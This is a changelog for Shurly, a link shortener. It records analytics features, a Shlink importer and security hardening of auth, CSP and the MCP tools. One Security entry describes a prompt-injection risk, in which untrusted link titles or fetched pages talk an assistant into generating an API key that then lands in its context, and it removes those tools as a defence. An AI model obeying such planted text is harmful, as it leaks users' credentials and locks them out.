# Changelog

All notable changes to Shurly are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## API Versioning Policy

The HTTP API is versioned in the URL path (`/api/v{N}/...`).

- A new major version (`/v2/`) is introduced only when a backwards-incompatible
  change is required.
- The previous version is kept live alongside the new one until all known
  clients have migrated, then announced as deprecated for at least one minor
  release before removal.
- Additive changes (new endpoints, new optional fields) ship under the current
  version without bumping it.
- Breaking changes within a major version are forbidden — if you find one,
  it's a bug.

The OpenAPI/SemVer version of the application (e.g. `0.1.0`) tracks the
implementation lifecycle and is independent of the URL version segment.

---

## [Unreleased]

### Added — a campaign's analytics (Phase 3.17)
- **The campaign page's header numbers are all-time and about people** (`/totals`):
  - **Clicked:** the recipients who clicked their link, as a share of all of them;
  - **Opened:** the recipients who opened the email (its tracking image), with a note that Apple Mail's automatic
    opens count too;
  - **Recipients** and **Clicks**.

  "Opened" used to mean "clicked their link". It's "Clicked" now, here and on the campaigns list.
- **The link page's Analytics section, over all the campaign's links:** the period, By time, By context and By
  location. There's no list of visits, on purpose.
- **Recipients, all time, a page at a time:**
  - search; All, Clicked, Opened or Not yet, each with its count;
  - sorted by clicks, opens, the last click or the link;
  - ticks that survive a page change, for "Copy their links";
  - Export CSV of every recipient that matches (`/recipients.csv`). It replaces the "Download click report" menu
    item.
- "Unique visitors" and "Most engaged" are gone. Sorted by clicks, the recipients put the most engaged first.
- The Analytics section is one component for both pages (`AnalyticsSection.astro`, `analytics-section.ts`).

### Added — the API for a campaign's analytics (Phase 3.17)
- **Five routes under `/api/v1/analytics/campaigns/{campaign_id}/`, for the campaign's page.** The contract is in
  ROADMAP 3.17.1:
  - **`/totals`**: the header's all-time numbers: recipients, clicks, email opens, **Clicked** and **Opened**
    (the recipients with at least one click, or at least one pixel open; one can be both), the click and open
    rates, countries, and the last click.
  - **`/timeseries`** and **`/breakdown`**: a link's (Phase 3.16), over all the campaign's links, with the same
    period, kinds and labels.
  - **`/recipients`**: all time, for following up with people. Each recipient has their link, CSV row, clicks,
    opens, first and last click and last open.
    - A filter: all, Clicked, Opened or none.
    - A search over their CSV values and code.
    - A sort, and 50 a page.
    - `counts`: how many each filter gives for the search.

    Searching, filtering, sorting and paging all happen in the database.
  - **`/recipients.csv`**: the same, every row, spreadsheet-safe. It isn't an MCP tool.
- **They answer for exactly the campaigns `/users` answers for:** the organization's, whatever the role, and your
  own. `/summary`, `/users` and the new routes now decide with one function.
- **The open rate overcounts, as opens do:** Apple Mail Privacy Protection loads the pixel when a message arrives,
  read or not.
- **The MCP gains `get_campaign_totals`, `get_campaign_timeseries`, `get_campaign_breakdown` and
  `list_campaign_recipients`.** `/summary` and `/users` are unchanged.

### Added — a campaign's recipients table (styleguide, Phase 3.17)
- **`recipientsView()`** (`frontend/src/utils/recipients.ts`), for the campaign page's Recipients: a table on
  wide screens (the CSV's columns, the link with Copy and QR, clicks, opens, the last click) and stacked rows
  on phones, with Clicked and Opened badges. Clicks, opens, the last click and the link sort from their
  headers (`aria-sort`); phones get a **Sort by** select. Each recipient's two checkboxes stay alike.
- The logic in `recipients-view.ts` (no imports, tested): sorting, the `/recipients` query, a recipient's name
  and line, the count, and why the list is empty. In `/styleguide/` → Data viz.

### Fixed — a link's last click is a click, and an unknown address isn't a visitor
- **A link's `last_click_at` moved on every visit the redirect logged, bots included.** So a link only bots had
  visited showed "Last … ago" in the dashboard next to no clicks, instead of "No clicks yet". It moves on a click
  now, as the analytics' `/totals` counts one: not a bot's visit, an email open, a crawler's preview or a
  `?nostat` hit. The Shlink import counted Shlink's potential bots the same way; it doesn't anymore.
- **Migration `0010` repairs what's stored:** each link's latest click, or nothing. Data only, in two
  statements. During the rollout, the previous release can still set a bot's time. So `users.api_key`'s drop
  takes `0011`.
- **Unique visitors don't count an unknown address.** Every visit imported from Shlink has ip "unknown" (it
  exposes none), and so does a visit whose address Shurly couldn't read. They made one extra "visitor" in the
  overview, a campaign's summary, top performers and users, and the MCP's link summary. So unique-visitor counts
  now cover the cutover onward, as the importer's README says.

### Added — a link's analytics, as on Shlink's link page (Phase 3.16)
- **The link page has an Analytics section for a period:** 7, 30 or 90 days, or a custom range. The period
  stays in the address and the tab in its hash, so a reload or a shared link keeps both.
  - **By time:** clicks or email opens by day, week or month, and by hour of the day and day of the week.
  - **By context:** operating systems, browsers and devices as donuts, and referrers.
  - **By location:** countries, with Unknown last.
  - **Visits:** each visit, newest first: clicks, email opens, bots or all. A table on wide screens, stacked
    rows on phones, 20 a page.
  - **Export CSV:** every visit of the period (`/visits.csv`), spreadsheet-safe.
- **The header's numbers are all-time** (`/totals`): clicks, email opens, countries and the last click. The
  "Last 7 days" and "Last 8 weeks" cards gave way to the period.
- A period with email opens and no clicks shows its opens first. Opens carry a note: Apple Mail loads an
  email's images on its own.
- A column chart's labels thin out when its columns get narrow, and the chart takes one tab stop: the arrow
  keys move between its columns.
- `npm run build` fails if development-only code reaches a build (`scripts/check-dev-only.mjs`): the
  analytics' mock, which `&mock` loads under `astro dev` only.

### Added — a donut chart, and "Show all" for bar lists (styleguide)
- **`donutChart()`** (`frontend/src/utils/charts.ts`, geometry in `donut.ts`), for the link's analytics by
  context: shares of one total in one hue, four blues and a grey tail ("Other" past five), the total in
  the hole, a legend with a **Show numbers** switch (`bindShowNumbers()`), and a table twin with shares
  (`donutTable()`). The legend is the list screen readers read, numbers included; its keys take focus.
  In `/styleguide/` → Data viz.
- **`barList()`** takes a `limit`: the rest wait behind **Show all N**. A cut label shows in full on hover,
  and each value names its unit for screen readers.
- **`dataTable()`** can add a share column: whole percents that add up to 100.

### Added — the API for a link's analytics (Phase 3.16)
- **Five new routes under `/api/v1/analytics/urls/{short_code}/`, for the link's page.** The contract is in
  ROADMAP 3.16.1:
  - **`/totals`**: the header's all-time numbers: clicks, email opens, the countries clicks came from, and the
    last click.
  - **`/timeseries`**: clicks and opens side by side, per local day, ISO week or month, clipped to the period.
    Also per hour of day and per day of week.
  - **`/breakdown`**: by OS and browser family, device, referrer host and country. Each value has its count
    and share, with "Unknown" and "Direct" (no referrer) as values.
  - **`/visits`**: the visits, newest first, a page at a time (20 by default, up to 100), with a total for
    "1–20 of N". Each shows its local time, kind, country, browser, OS, device and referrer host. **Never an
    IP, a user agent or a full referrer.**
  - **`/visits.csv`**: every visit of the period, streamed: the list's columns plus the raw user agent, still
    no IP, every cell spreadsheet-safe.
- **They take a period:** `period=N`, the last N local days with today (30 by default), or `from` and `to`, at
  most 731 days and ending today at the latest. With `tz` and `domain`, as the others.
- **Every visit is one kind: a click, an email open (a pixel hit that isn't a bot's) or a bot's.**
  `/breakdown`, `/visits` and `/visits.csv` take `type=clicks|opens|bots|all` (the CSV defaults to `all`). A
  click is what every other count calls one.
- **Opens overcount:** Apple Mail Privacy Protection loads the pixel when a message arrives, read or not.
- **User agents are parsed when the numbers are asked for, not stored.** So the labels always follow the parser.
- **The MCP gains `get_url_totals`, `get_url_timeseries`, `get_url_breakdown` and `list_url_visits`.** The
  CSV isn't a tool: an assistant pages through the list instead of pulling every visit into its context.
  `/daily`, `/weekly` and `/geo` are unchanged.

### Security — `deploy_ecs.sh` no longer overwrites production's settings
- **The script only creates the ECS service now.** Run against the live service, its update path sent the
  container it builds, whose environment holds 20 variables, and so dropped every setting added on the service
  since: sign in with Google, the MCP's OAuth, `FRONTEND_URL`, and whatever gets added there later.
- Once the service exists it stops before building anything, and says where to go: a merge to `main` for an
  image (the deploy workflow changes only the image), the live service for a setting (DEPLOYMENT.md § Settings).
  A failed lookup stops it too. `tests/test_deploy_ecs_script.py` runs it against stubbed `aws` and `docker`.
- The playbook's "Deploy from local", and its JWT and database password rotations, no longer re-run it.
- Docs: in production the Google sign-in's code exchange is same-origin, so `CORS_ORIGINS` needs no entry for
  it (DEPLOYMENT.md § Settings, `docs/setup_google_app.md` step 7).

### Removed — the legacy `/api/v1/stats/*` routes
- **`GET /api/v1/stats/day/{surl}`, `…/week/{surl}`, `…/world/{surl}`, `…/main` and `…/next/{surl}` answer `404`.**
  They were mounted without authentication, and broken since Phase 1.4: they queried columns that don't exist
  (`urls.short_url`, `visits.created_at`), so every call was a `500`. No client can depend on them, since no call
  ever succeeded. `/api/v1/analytics/*` serves these numbers, for the links the caller can see.
- The MCP's rule that kept them out of its tools is gone with them.

### Fixed — the last `shurl.griddo.io` defaults, and the docs of rule 12
- **The link previews' fetcher names a host that exists.** Its User-Agent pointed at `https://shurl.griddo.io`,
  which never existed. It's `https://shurly.griddo.io` now (`server/utils/opengraph.py`).
- **CORS lists no other origin by default**: `.env.production.example` and `deploy_ecs.sh` listed
  `https://shurl.griddo.io`, and now say `'[]'`, since the frontend shares the API's host (DEPLOYMENT.md § CORS).
  `deploy_ecs.sh` no longer calls `CORS_ORIGINS` required, as it has a default. Production keeps its own value:
  the GitHub deploy changes only the image. A test loads the template and checks its value.
- The playbook, the rule-sync README and DEPLOYMENT.md show both hosts on ALB rule 12 (`shurly.griddo.io` and
  `s.griddo.io`) and the health check on `shurly.griddo.io`. DEPLOYMENT.md says the image is built for amd64 and
  arm64 (Fargate runs amd64), not for arm64 alone.

### Fixed — a link's click limit counts clicks only
- **The click limit (`max_visits`) counted every visit, email opens through the tracking pixel and bot hits
  included.** So a link could answer 410 Gone while its page still showed clicks left ("3 of 5 clicks used").
  It counts the link's `click_count` now: one definition for the limit, the link page and the stats.
- **Shlink's imported visits count the same way** (`--visits`): the clicks do, the bots and pixel opens don't.
  Shlink counted every visit, so a link it had capped can have clicks left in Shurly.

### Added — a visit's country (Phase 8.4)
- **Visits record their country**, as an ISO 3166-1 alpha-2 code, from DB-IP's IP to Country Lite database
  (CC BY 4.0, no account). It had been null for every visit Shurly recorded.
  - The lookup is in process, against a memory-mapped file, with no network call on the redirect path.
  - It uses the address that's stored: the anonymized one when `ANONYMIZE_REMOTE_ADDR` is on. Only the country is
    kept.
  - Without the database, visits simply have no country, and the app logs `geo.database_missing` once.
- **The image build fetches the database** (`scripts/fetch_geoip.py`): this month's or last month's, installed
  only if it places 8.8.8.8 in the US. A failed fetch doesn't fail the build: the deploy job warns on the run's page.
  `GEOIP_DATABASE` names the file; empty turns lookups off.
- **The link page shows country names**, from the browser (`Intl.DisplayNames`), with "Countries by DB-IP".
- **The Shlink import stores country codes too** (`visitLocation.countryCode`), since providers name some countries
  differently. The geo CSV and the MCP's summary carry codes.

### Security — an API key can't change the password
- **`POST /api/v1/auth/change-password` took an API key.** So a leaked key was enough to guess the account's
  password there, where the login's limit on failed attempts doesn't apply, and a right guess replaced it. It
  takes a signed-in session now, like setting and removing a password (Phase 3.13.3): an API key gets a `403`,
  even with the current password.

### Security — every password check is limited, and an API key can't make a new one
- **A wrong current password counts as a failed login.** `POST /api/v1/auth/change-password` and
  `PUT /api/v1/auth/password` (with `current_password`) checked it without a limit. So a stolen session could guess
  the password for as long as it lived, then set one that outlives it.
  - A wrong one now counts with the login's failures for that account (`RATE_LIMIT_LOGIN_FAILURES_PER_ACCOUNT`,
    10 per 15 minutes), so guesses on any of the three add up. Over the limit, each answers `429` with
    `Retry-After`.
  - The right password never counts. As with the login, over the limit it waits for the window too. Signing in
    with Google stays open, and with it a new password without the old one.
- **`POST /api/v1/auth/api-key/generate` takes a signed-in session.** An API key could call it, so a leaked key
  could mint its own replacement, ending the owner's. It gets a `403` now. Revoking with a key still works: that
  gives nothing away.
- The API docs list the `429` of these endpoints, and the login's.

### Security — Trusted Types on every page (Phase 6.3)
- **Every page's policy now includes `require-trusted-types-for 'script'` and `trusted-types shurly-html`.**
  The DOM's HTML sinks (`innerHTML` and the like) take TrustedHTML only, from one policy.
- **That policy lives in `src/utils/html.ts`**, behind `setHTML` and `toElement`, and nowhere else can reach
  it. It lets through only markup built by the escaping `html` tag, and escapes anything else: a string, or
  an object that merely looks like `html`'s output.
- **A stray `el.innerHTML = '…'` now throws**, in the browsers that support Trusted Types. So does any
  other policy, or a second one. Other browsers ignore the directives and render as before.
- **The QR code's preview goes through `setHTML` too.** It was the last raw sink.
- **Checked before switching it on:** the built bundles, and the app page by page with Trusted Types enforced.
  The only sinks are ours; Astro and the libraries use none.
- **The build now fails** without the two directives, or when the policy allows `default`, `*` or
  `'allow-duplicates'`. `frontend/tests/no-raw-html.test.mjs` fails on a `createPolicy` outside `html.ts`.
- **It also fails unless exactly one built script chunk defines the policy.** None means the policy was
  lost. Two mean `html.ts` was bundled twice, and a page loading both would throw at the second
  `createPolicy`.

### Added — importing Shlink's links (Phase 8.4)
- **`python -m server.tools.shlink import <snapshot> <review.csv> --as <owner>`** imports every link the review
  keeps, with its exact code (never lowercased), its domain and its creation date, owned by the organization.
  `--dry-run` does it all and rolls back.
- **Mapped:** the destination, title, tags (`archive` adds `legacy`), validity window, visit cap, `crawlable`,
  query forwarding and redirect rules. A rule with a condition Shurly has no equivalent for (IP address,
  geolocation) is left out whole. `language en-US` becomes `en`. The report lists all of it.
- **It can run again.** An identical link is left alone. A link there with another destination, or one Shurly
  can't take (a code over 20 characters, one of its own paths, a destination that isn't http(s)), stops the import
  before anything is written, unless the review drops it.
- **`--visits` imports Shlink's visits** (decision A, 2026-09-28):
  - `ip` is "unknown", which tells them apart; unique-visitor counts cover the cutover onward only;
  - bots and the `/track` pixel come as Shlink flagged them;
  - a later snapshot adds only the newer visits.
- `server/tools/shlink/README.md` documents it. How it runs against production is still to be decided.

### Added — "Created by" names on links (Phase 3.12)
- **Link cards and the link page say who created it by name**, e.g. "Created by Ana García", with the email
  as a tooltip, as campaigns do. "You" stays "you", and someone without a name still shows their email.
- **Link responses keep `created_by_email` and gain `created_by_first_name` and `created_by_last_name`**,
  null without a profile. That covers creating a link (standard or custom), the list, the detail, an edit,
  and the MCP's link tools. The list, the busiest endpoint, loads every creator's profile in one query,
  whatever the page holds.

### Added — "Created by" names on campaigns (Phase 3.12)
- **Campaign cards and the campaign page say who created it by name**, e.g. "Created … by Ana García", with
  the email as a tooltip. "You" stays "you", and someone without a name still shows their email. Links
  follow once their responses change for 8.3.
  - **On phones, the card's "by …" takes its own line under the date.** It used to be cut off beside "View
    campaign". Wider screens keep one line.
- **Campaign responses keep `created_by_email` and gain `created_by_first_name` and
  `created_by_last_name`**, null without a profile. That covers creating a campaign, the list, the detail
  and the MCP's campaign tools. The list loads every creator's profile with the page: one query, not one
  per campaign.

### Added — a link is its code and its domain (Phase 8.3)
- **The routes that take a link's code take `?domain=`**: `/api/v1/urls/{short_code}` and its tags, previews and
  rules, and the link's daily, weekly and geo analytics. Once Shlink's links are imported, one code can name a
  link on the default domain and another on `go.griddo.io`. Until now the API answered with whichever it found
  first.
- **Without `?domain=`, the default domain's link answers**, then the other domains' by hostname. A link from
  before domains counts as the default domain's. So a bookmark of a link's page without a domain keeps working.
- **`?domain=` is read like a request's `Host`:** lowercase, without a port or a trailing dot
  (`normalize_hostname`). The redirect path now drops a trailing dot too: `go.griddo.io.` finds `go.griddo.io`
  instead of falling back to the default domain.
- **Each link says its `domain`**, and its `short_url` is built on that domain: in link responses, campaigns and
  their CSV export, the analytics overview, link previews, and the page a social crawler gets. `BASE_URL` still
  applies only to the default domain.
- **Bulk tagging takes `links: [{short_code, domain}]`.** A plain `short_codes` entry tags one link per code, by
  the same default rule.
- **The MCP's tools take `domain` too:** the generated ones from the API, plus `add_redirect_rule` and
  `get_url_analytics_summary`. The summary also names the domain that answered.
- **The dashboard passes the domain.** Links in the list and in the analytics carry it. The link page sends it with
  every call, and puts it in its address once the link has loaded. The list keys its cards and its selection by
  the link's id, not its code.

### Added — names in Settings → Organization (Phase 3.12)
- **Members and removed people show their name, with the email under it.** Someone without a name in
  their profile shows the email, as before.
- **Confirmations, toasts and labels use the name**, e.g. "Remove Ana García?" and "Ana García is now an
  admin". A dialog also names the account ("Their account is ana@griddo.io."), as two people can share a
  name.
- **`GET /api/v1/organization/members` and `/removed-members` gain `first_name` and `last_name`**, null
  without a profile. So do the role-change and ownership-transfer answers, and the MCP's
  `list_organization_members`. The order is unchanged.
- **The members list loads the users and their profiles with it:** two queries, not one per member, which it
  was for the users already.

### Fixed — a link's analytics count only its own visits
- **Daily, weekly and geo stats (and their CSVs) and the campaign timeline counted visits by code.** The same
  code can name links on two domains, as at the Phase 8 import, next to the test links on `s.griddo.io`. So one
  link's stats could include another's visits. They're keyed on the link now (`visits.url_id`).
- **The MCP's `get_url_analytics_summary` counted tracking-pixel hits as clicks with `include_bots`.** It
  follows the app's rule now: a pixel hit is an open, never a click.

### Changed — analytics days are the viewer's days
- **Link daily and weekly stats, the overview's recent activity and the campaign summary's timeline count
  days in the viewer's time zone.** That's their profile's zone, or UTC without one (as before).
  - `?tz=` counts in another zone: an IANA name, with the profile's rules, and a 422 otherwise. It changes
    how visits are grouped into days, never which visits count.
  - Each response says which zone it used: `timezone`.
  - A day runs from local midnight to local midnight, so a DST day lasts 23 or 25 hours.
- **Behaviour change for API consumers: the overview's `recent_clicks_7d` is now the last 7 calendar days,
  today included, where the viewer is.** It's the sum of `recent_activity`. It used to be a rolling 168
  hours, so it didn't match the chart next to it.
- **The MCP's `get_url_analytics_summary` counts its days the same way**, so the app and the MCP give the
  same numbers. It says its `timezone` too.
- **The charts' "Today" is today in that zone.** Without a time zone in the profile, a hint under the chart
  says the days are in UTC and links to Settings → Account.

### Fixed — the weekly stats count today
- **The 8 weeks of `GET /api/v1/analytics/urls/{code}/weekly` ended yesterday.** So today's clicks were in
  none of them, nor in the link page's "this week vs last". They end today now.
- **Tests on SQLite read every day as 0**, because SQL's `date()` returns a string there. That hid wrong
  counts. Days are now bounded by UTC instants, and the tests check exact counts.

### Added — a photo for your account (Phase 3.12)
- **Settings → Account → Profile has a photo.** Pick a file or drop one on it: JPEG, PNG or WebP, up to 10 MB.
  - Then place it in a crop dialog: drag or arrow keys to move it; wheel, pinch, slider or + and − to zoom.
  - The circle is always covered: zooming out stops when the photo's short side fills it, and it can't be
    dragged off.
  - "Remove" goes back to the initial. The header shows the photo too.
- **`PUT /api/v1/auth/me/avatar`** takes the image as the request body: a JPEG, PNG or WebP by its magic
  bytes, whatever the Content-Type says.
  - It's refused past 2 MB as it streams in (413), and past 4096 pixels a side before its pixels are
    loaded (413). Anything else is a 415.
  - It's stored re-encoded as a 512×512 WebP, turned by its EXIF orientation and cropped to its centre.
  - **No metadata is kept:** no EXIF (so no GPS or camera), XMP or ICC profile.
  - `profile.avatar_version` (on `/auth/me` and the profile endpoints) changes with each upload.
- **`GET /api/v1/auth/me/avatar`** answers the WebP, and 404 without one.
  - The `?v=<avatar_version>` URL of the current version is immutable in the browser's cache. Any other,
    the bare one included, is `private, no-cache` and revalidated against the ETag (304).
  - With `X-Content-Type-Options: nosniff`.
- **`DELETE /api/v1/auth/me/avatar`** removes it.
- None of these is an MCP tool.
- **Pillow is a new dependency** (a floor at 11.3). It parses untrusted input here, so it's held to the
  decoder the magic bytes name, `MAX_IMAGE_PIXELS` is set explicitly, and a decompression bomb is refused
  with a 413. Keep it up to date.
- **Migration 0009** adds the avatar's columns to `user_profiles`: new nullable columns only. The image
  column is deferred, so reading or saving the profile never loads it.

### Added — exporting and reviewing Shlink's links (Phase 8.4)
- **`python -m server.tools.shlink export`** reads Shlink's REST API into one raw JSON snapshot. It holds every
  short URL as Shlink returned it, its redirect rules, and with `--visits` every visit. It's read-only, and the
  API key (`SHLINK_API_KEY`) is only ever sent in its header: never written to the file or printed.
- **The snapshot can hold personal data** (visits' user agents, referers and locations). It's written readable by
  its owner only, into `_exchange/` by default. `*.snapshot.json` and `*.review.csv` are git-ignored.
- **`… review <snapshot>`** writes a CSV to decide `keep`, `archive` or `drop` for each link, `keep` by default.
  It flags duplicates, codes that differ only in case, expired or capped links, and redirect-rule conditions
  Shurly has no equivalent for. Every cell is spreadsheet-safe.
  - `capped` is Shlink's rule, every visit. `capped_in_shurly` is Shurly's, clicks only: whether the link
    arrives capped from an import with `--visits`. A link with the first and not the second reopens.
- **`--check-destinations`** fills in each destination's HTTP status. It goes through the link previews' SSRF
  guard, now also exposed as `guarded_request` (`HEAD` as well as `GET`): public http(s) addresses only, each
  redirect hop checked, 8 at a time.
- `server/tools/shlink/README.md` documents both. The import comes next.

### Added — a profile: name, country and time zone (Phase 3.12)
- **Settings → Account → Profile** has first name, last name, country and time zone, saved together.
  - The time zone list follows the country, and a country with one zone picks it.
  - Without a saved time zone, this browser's is picked, for the person to save.
  - Labels show the current offset, e.g. "Atlantic/Canary (GMT+1)".
- **The header's initial comes from the first name**, and from the email without one.
- **`GET /api/v1/auth/me` returns `profile`**: `first_name`, `last_name`, `country` and `timezone`,
  each null until set. Nothing else in the response changed.
- **`PATCH /api/v1/auth/me/profile`** changes the fields it's sent; null, or a blank name, clears one.
  - Names are trimmed, 100 characters at most, one line.
  - `country` is an ISO 3166-1 alpha-2 code.
  - `timezone` is an IANA name, never an offset. A legacy one is stored as the current one:
    `Asia/Calcutta`, which Chrome still reports in India, becomes `Asia/Kolkata`.
  - The MCP has it too, as `update_my_profile`.
- **Signing in with Google starts the profile** with the names in the ID token, for an account that has
  no profile yet. After that the profile is the person's: Google never changes it, not even names they
  cleared. The web sign-in now asks Google for the `profile` scope; the MCP's sign-in doesn't.
- **Time zones and countries are checked against the `tzdata` package, a new dependency**, not the
  server's own database. The production image's has 486 zones and none of the legacy names.
  - The picker's lists (`frontend/src/data/timezones.json`) come from the same package, through
    `scripts/generate_timezones.py`.
  - A test fails when they drift apart.
- **Migration 0008** adds the `user_profiles` table. A row is made on the first save.

### Changed — `users.api_key` is no longer mapped, ahead of its drop (Phase 6.3)
- The plaintext column, empty since `0007`, stayed mapped as `_legacy_api_key`, so the ORM still named it in every
  SELECT and INSERT of a user. Dropping it in the next release would have failed every user query on the task still
  running this one, mid-rollout: signing in, every authenticated call, the MCP.
- This release doesn't map it. A PostgreSQL test drops the column by hand and runs this release against the result:
  signing in, generating an API key, `/me`, an MCP tool call with the key, revoking.
- The release after drops it, in migration `0011` (0009 is the avatar, 3.12; 0010 repairs `last_click_at`). Until then the migration drift test ignores exactly that column
  and its index, and a guard fails once they're gone.

### Security — the client IP behind CloudFront (Phase 6.3)
- **Behind CloudFront, the client IP is the viewer's, not the edge's.** Once `shurly.griddo.io` goes through the
  distribution (4.10), the ALB's peer is a CloudFront edge, and every per-IP rate limit would have counted
  everyone behind the same edge as one. The app now takes the address from `CloudFront-Viewer-Address`.
- **But only from a request that proves it came through the distribution:** one carrying a secret that the
  distribution adds as a custom origin header (`CLOUDFRONT_ORIGIN_SECRETS`, compared in constant time; two values
  while it rotates, each at least 32 characters). The ALB is shared and reachable directly, and anyone can send
  `CloudFront-Viewer-Address`, but not the secret. Without the secret, or when the header is missing or doesn't
  parse, the address comes from `X-Forwarded-For` as before. It's off until the secret is set.
- **And only when it's the address CloudFront appended to `X-Forwarded-For`**, second from the right, before the
  edge the ALB appends; compared in canonical form, so an IPv6 address written two ways still matches. That holds
  if the origin request policy is wrong, or the ALB stops appending: either way the address comes from
  `X-Forwarded-For`.
- **One `client_ip`** (`server/utils/network.py`) decides the address for the rate limits and the visit log.
- The secrets print as `**********` in the settings, and are never logged.
- `DEPLOYMENT.md` § Frontend hosting sets up the distribution for this. Its API behaviours now use the origin
  request policy that adds CloudFront's headers (AllViewerAndCloudFrontHeaders-2022-06, not AllViewer). The ALB rule
  that refuses `shurly.griddo.io` without the secret is documented as optional defence in depth, per host.

### Fixed — orphan visits store the client's address, anonymized, like visits
- A visit to the bare short-link host (`/`) stored the socket's address: the ALB's in production, or the full,
  unanonymized address without a proxy. An unknown short code with `ANONYMIZE_REMOTE_ADDR=false` stored the ALB's
  address too. Both now store what a visit stores (`visit_ip`): the client IP, resolved first and then anonymized.

### Security — the deploy masks the container's credentials again
- **`deploy-backend.yml` reads the container from `service.activeConfigurations[0]`**: it read
  `service.primaryContainer`, which is null for Express services, so the step that masks
  credential-looking values (`DB_PASSWORD`, `*SECRET*`, `*KEY*`…) in the logs masked nothing. No value
  was printed (the update's response goes to /dev/null), but the defence wasn't there. It takes the
  newest active configuration (a rollout has two, in no promised order, and the old one would put
  previous settings back), and stops if it finds no image and environment.

### Removed — `CI_CD_SETUP.md`, the Lambda-era deploy guide
- It described access keys, SAM and API Gateway. The deploys it covered are in DEPLOYMENT.md:
  § CI/CD with OIDC (the backend, to ECS) and § Frontend hosting (the frontend, to S3 + CloudFront).
  Nothing linked to it.
- **DEPLOYMENT.md § Workflow trigger** said the backend deploy ran only by hand. It runs on every push
  to `main`, and by hand for a rollback.

### Security — SQL built only from bound parameters, checked (Phase 6.3)
- **Audited:** the API reaches the database through the ORM and SQLAlchemy Core, which bind every
  value. The raw SQL left is static (`SELECT 1`) or takes `:name` parameters (the migration lock).
  Migrations format only constant table names.
- **Fixed: `%` and `_` in a tag search are characters now, not LIKE wildcards.** `GET /api/v1/tags?search=_`
  returned every tag. The links search already escaped them.
- **`tests/test_sql_safety.py`** parses the backend (`server/`, `mcp_server/`, `main.py`) and fails on:
  - `text()`, `exec_driver_sql()` or `literal_column()` given anything but a string literal;
  - a LIKE helper on a column fed a variable without `autoescape=True`.
  Exceptions need an allowlist entry with a reason; the list starts empty.

### Security — no API keys, passwords or session tokens through the MCP (Phase 6.3)
- **The `generate_api_key` and `revoke_api_key` tools are gone.** An assistant reads
  untrusted text, such as link titles and fetched pages, which could talk it into "generate a
  new API key". The new key would then land in its context, the leak that taking the key out of
  `/auth/me` closed, and the key the person uses would stop working. Like changing the
  organization or the password, this is left to the person: Settings → API & MCP, or
  `POST /api/v1/auth/api-key/generate` and `DELETE /api/v1/auth/api-key`, which are unchanged.
- **So are `login` and `change_password`.** `login` put a JWT in the assistant's context, and
  both took a password from it. The MCP is already signed in, so neither did anything there that
  the person needs. `POST /api/v1/auth/login` and `POST /api/v1/auth/change-password` are
  unchanged.
- The MCP now has 39 tools (35 generated from the API, 4 curated).

### Security — a Content-Security-Policy on every page (Phase 6.3)
- **Every built page carries a Content-Security-Policy**, a `<meta>` written by Astro with the hashes of
  the scripts it emits.
  - Scripts run only from this site or by hash: no `'unsafe-inline'`, no `'unsafe-eval'`.
  - The few inline scripts (the sign-in redirects, and Settings opening the tab its address names) live in
    `frontend/src/inline-scripts.mjs`, and their hashes come from the same strings.
  - Style attributes set from data are the only inline styles allowed (`style-src-attr`).
  - Images may come from any https site (link previews); API calls go to the API's origin only.
- **The sign-in redirects moved to the top of `<body>`.** A `<meta>` policy only governs what follows it,
  and Astro writes it at the end of `<head>`. They still run before anything paints.
- **`npm run build` fails on a page the policy doesn't cover:** no policy, a script or preload before it, an
  inline script or `<style>` without its hash, an inline event handler, or a `javascript:` URL.
- The user manual says an API key is shown only once, when it's generated, and what to do if it's lost.

### Security — API keys are stored as a hash and shown once (Phase 6.3)
- **The database no longer holds API keys.** It keeps each key's SHA-256 hash and first
  12 characters (`users.api_key_hash`, `users.api_key_prefix`). Migration `0007` moves every
  existing key there and empties `users.api_key`, which a later release drops. Keys made before
  keep working. A key is looked up by its hash, through a unique index, so the key itself is never
  compared.
- **`GET /api/v1/auth/me` no longer returns `api_key`.** It returns `has_api_key` and
  `api_key_prefix` instead. This breaks the versioning policy above, on purpose: the key can't be
  returned once only its hash is kept. The only client that read the field, Settings → API & MCP,
  changes in the same release. `/auth/me` is also the MCP's `get_current_user_info` tool, which
  used to put the key in an assistant's context whenever it asked who you are.
- **The key is shown once, by `POST /api/v1/auth/api-key/generate`.** Settings says "copy it now:
  it won't be shown again". Later it shows how the key starts, and Regenerate. "Copy with my
  key" is there right after you generate a key; otherwise the command keeps `<your API key>`.
- **New keys start with `shurly_`**, so people and secret scanners can recognise a leaked one. A
  token with two dots is still a JWT, whatever it starts with.
- While `0007` rolls out, the task still on the previous release answers 401 to API keys
  (`DEPLOYMENT.md` § API keys).

### Changed — the frontend deploy, ready for S3 + CloudFront (Phase 4.10)
- **`deploy-frontend.yml` rewritten for the chosen setup:**
  - OIDC with its own least-privilege role (`AWS_FRONTEND_DEPLOY_ROLE_ARN`), no access keys.
  - The production values: `PUBLIC_API_URL=https://shurly.griddo.io`, `PUBLIC_SHORT_DOMAIN=s.griddo.io`.
  - Tests and the build before any upload.
  - Only the hashed `_astro/` files are cached for good. Pages, favicons, `og-image.png` and the manifest
    revalidate, where before every non-HTML file was cached for a year.
  - A CloudFront invalidation after each deploy.
  - It runs on merges to `main` that touch the frontend, and while `FRONTEND_BUCKET` is unset it says
    it skipped instead of failing.
- **CI builds the frontend:** `npm ci`, `npm test` and `npm run build` (astro check) on every PR.
- **A CloudFront Function** (`infra/cloudfront/static-paths.js`, with tests) gives a private bucket its
  directory indexes and adds the missing trailing slash, and it can't redirect off the site.
- **DEPLOYMENT.md § Frontend hosting** covers the distribution's behaviours for the app, the API and the MCP,
  the us-east-1 certificate, the bucket, the deploy role's policies, cutover and rollback, and two open
  decisions: error pages, and client IPs behind CloudFront.

### Fixed — a long value from outside a schema no longer fails with a 500
- **A link to a page with a long title is created.** The title fetched for the preview
  went into `og_title` (255 characters) as it was, and PostgreSQL refused a longer one:
  a 500 on creating the link, on refreshing its preview, or on the live preview's
  suggestion. Fetched titles are cut to the column now.
- **A redirect with a long `X-Forwarded-For` redirects.** Behind a trusted proxy, the
  address stored with a visit or an orphan visit came from that header, and a value
  longer than the column (50) was a 500 on the redirect itself. Addresses are cut to
  their column (`fit`, `server/utils/columns.py`).
- **The MCP's `create_campaign_from_rows` refuses a name over 255 characters**, as the
  API does; it writes through the ORM, past the API's schema, and a longer name was a
  500. A test pins every request field stored in a bounded column to a `max_length`
  within that column, so the gap can't come back unnoticed.

### Changed — CORS allows only what the frontend uses
